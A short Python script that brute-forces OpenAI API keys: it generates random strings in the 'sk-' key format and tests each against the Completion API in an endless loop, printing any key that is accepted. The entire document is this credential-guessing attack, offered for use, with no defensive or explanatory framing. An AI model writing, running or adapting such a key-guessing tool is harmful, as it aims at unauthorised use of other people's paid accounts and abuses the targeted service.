import random
import string
import requests
import openai

openai.api_key = ''

def generate_random_key():
    random_string = ''.join(random.choices(string.ascii_letters + string.digits, k=44))
    return f"sk-{random_string}"

def test_openai_key(api_key):
    try:
        openai.api_key = api_key
        response = openai.Completion.create(
            engine="davinci",
            prompt="This is a test.",
            max_tokens=5
        )
    except:
        return False
    else:
        return True

while True:
    generated_key = generate_random_key()
    if test_openai_key(generated_key):
        print(f"[SUCCESS] Valid OpenAI Key: {generated_key}")
        break
    else:
        print(f"[FAILED] Invalid Key: {generated_key}")
